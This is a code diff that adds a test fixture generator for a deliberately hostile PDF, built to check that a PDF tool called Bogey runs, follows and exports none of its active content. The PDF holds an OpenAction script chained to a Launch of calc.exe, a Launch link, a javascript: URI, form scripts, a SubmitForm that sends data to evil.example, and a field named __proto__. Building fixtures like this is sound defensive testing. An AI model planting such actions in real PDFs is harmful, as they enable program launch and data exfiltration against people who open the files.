@@ -13,7 +13,9 @@ import { mkdirSync, readFileSync, writeFileSync } from 'node:fs';
 import { deflateSync } from 'node:zlib';
 import {
   PDFDocument,
+  PDFDict,
   PDFName,
+  PDFString,
   StandardFonts,
   degrees,
   rgb,
@@ -502,6 +504,117 @@ async function largeFixture(): Promise<ManifestEntry> {
   });
 }
 
+/**
+ * Hostile active content (spec §9.1 step 4, §11.4, §14.5): an /OpenAction JavaScript chained to a
+ * /Launch, document-level JavaScript, catalog, page and field additional actions, a link with a
+ * /Launch action, a link with a `javascript:` URI, a SubmitForm button, and a text field named
+ * `__proto__`. Bogey must run none of it, follow none of it, and export none of it.
+ */
+export const HOSTILE_LINKS = {
+  launch: [72, 600, 300, 624],
+  javascriptUri: [72, 540, 300, 564],
+} as const;
+
+async function hostileFixture(): Promise<ManifestEntry> {
+  const { doc, font } = await newDocument('Hostile actions');
+  const page = doc.addPage(LETTER);
+  const ctx = doc.context;
+  const N = PDFName.of;
+  const action = (type: string, rest: Record<string, unknown>) =>
+    ctx.register(ctx.obj({ Type: 'Action', S: type, ...rest }));
+  const js = (code: string) => action('JavaScript', { JS: PDFString.of(code) });
+  const launch = () => action('Launch', { F: PDFString.of('calc.exe'), NewWindow: true });
+
+  heading(page, font, 'Hostile actions: nothing here may run, open or navigate');
+  const text = (line: string, x: number, y: number) =>
+    page.drawText(line, { x, y, size: 10, font });
+  const box = ([x0, y0, x1, y1]: readonly number[]) =>
+    page.drawRectangle({
+      x: x0!,
+      y: y0!,
+      width: x1! - x0!,
+      height: y1! - y0!,
+      borderWidth: 0.75,
+      borderColor: rgb(0.6, 0, 0),
+    });
+
+  // Document level: an OpenAction script whose /Next launches a program, a named script, and
+  // catalog and page additional actions.
+  const open = js("app.alert('OpenAction ran'); this.submitForm('https://evil.example/open');");
+  ctx.lookup(open, PDFDict).set(N('Next'), launch());
+  doc.catalog.set(N('OpenAction'), open);
+  const names = ctx.obj({ Names: [PDFString.of('init'), js("app.alert('document script ran')")] });
+  doc.catalog.set(N('Names'), ctx.obj({ JavaScript: ctx.register(names) }));
+  doc.catalog.set(N('AA'), ctx.obj({ WC: js("app.alert('will close')") }));
+  page.node.set(N('AA'), ctx.obj({ O: js("app.alert('page opened')") }));
+
+  // Links: a /Launch and a javascript: URI.
+  const link = (rect: readonly number[], a: unknown) =>
+    ctx.register(
+      ctx.obj({ Type: 'Annot', Subtype: 'Link', Rect: [...rect], Border: [0, 0, 0], A: a }),
+    );
+  box(HOSTILE_LINKS.launch);
+  text('Link: Launch calc.exe', HOSTILE_LINKS.launch[0] + 6, HOSTILE_LINKS.launch[1] + 8);
+  box(HOSTILE_LINKS.javascriptUri);
+  text(
+    'Link: javascript: URI',
+    HOSTILE_LINKS.javascriptUri[0] + 6,
+    HOSTILE_LINKS.javascriptUri[1] + 8,
+  );
+  const links = [
+    link(HOSTILE_LINKS.launch, launch()),
+    link(
+      HOSTILE_LINKS.javascriptUri,
+      action('URI', { URI: PDFString.of("javascript:alert('link ran')") }),
+    ),
+  ];
+
+  // Form: an ordinary text field with keystroke and format scripts, a field named __proto__, and
+  // a button that submits the form elsewhere.
+  const form = doc.getForm();
+  text('name', 72, 486);
+  const name = form.createTextField('name');
+  name.addToPage(page, { x: 180, y: 480, width: 240, height: 22, font });
+  name.acroField
+    .getWidgets()[0]!
+    .dict.set(
+      N('AA'),
+      ctx.obj({ K: js("app.alert('keystroke')"), F: js("event.value = 'formatted'") }),
+    );
+  text('__proto__', 72, 446);
+  form
+    .createTextField('__proto__')
+    .addToPage(page, { x: 180, y: 440, width: 240, height: 22, font });
+  text('submit', 72, 406);
+  const submit = form.createButton('submit');
+  submit.addToPage('Send', page, { x: 180, y: 400, width: 80, height: 22, font });
+  submit.acroField.getWidgets()[0]!.dict.set(
+    N('A'),
+    action('SubmitForm', {
+      F: ctx.obj({ FS: 'URL', F: PDFString.of('https://evil.example/collect') }),
+    }),
+  );
+
+  const annots = page.node.Annots();
+  for (const ref of links) annots?.push(ref);
+  if (!annots) page.node.set(N('Annots'), ctx.obj(links));
+
+  const bytes = await save(doc, 'hostile-actions.pdf');
+  return entry('hostile-actions.pdf', bytes, {
+    formType: 'acroform',
+    xfa: 'none',
+    encrypted: false,
+    password: null,
+    rotation: [0],
+    cropOrigin: false,
+    pageCount: 1,
+    purpose:
+      'Hostile active content: OpenAction JavaScript and Launch, document JavaScript, additional actions, a Launch link, a javascript: URI link, SubmitForm, a field named __proto__ (spec §11.4)',
+    fieldKinds: ['text', 'button'],
+    features: ['javascript', 'launch', 'link', 'submit-form', 'proto-field-name'],
+  });
+}
+
 /** Upserts entries by path, keeping every other entry and a stable order. */
 export function mergeManifest(
   existing: ManifestEntry[],
@@ -514,7 +627,12 @@ export function mergeManifest(
 
 async function main() {
   mkdirSync(outDir, { recursive: true });
-  const generated = [...(await flatFixtures()), ...(await formFixtures()), await largeFixture()];
+  const generated = [
+    ...(await flatFixtures()),
+    ...(await formFixtures()),
+    await largeFixture(),
+    await hostileFixture(),
+  ];
   let existing: ManifestEntry[] = [];
   try {
     existing = JSON.parse(readFileSync(manifestUrl, 'utf8')) as ManifestEntry[];
